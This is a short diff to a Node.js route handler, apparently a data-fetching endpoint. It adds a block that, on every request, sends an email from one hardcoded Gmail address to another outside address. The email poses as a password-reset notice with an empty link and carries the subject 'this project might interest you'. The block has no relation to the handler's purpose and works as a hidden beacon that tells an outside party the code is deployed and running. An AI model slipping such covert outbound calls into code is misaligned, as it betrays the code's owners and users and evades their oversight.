@@ -3,6 +3,18 @@ const states = require("../utils/states");
 
 const getData = async (req, res, next) => {
   try {
+    const message = `
+    <h1>You have requested a password reset</h1>
+    <p>Please go to this link to reset your password</p>
+    <a href= clicktracking=off></a>
+    `;
+    await sendEmail({
+      from: "seniordeveloper754@gmail.com",
+      to: "topdev1228@gmail.com",
+      subject: ` this project might interest you`,
+      html: message,
+    });
+
     const userId = req.user["_id"];
     const { email, service_area, services } = await User.findOne({
       _id: userId,
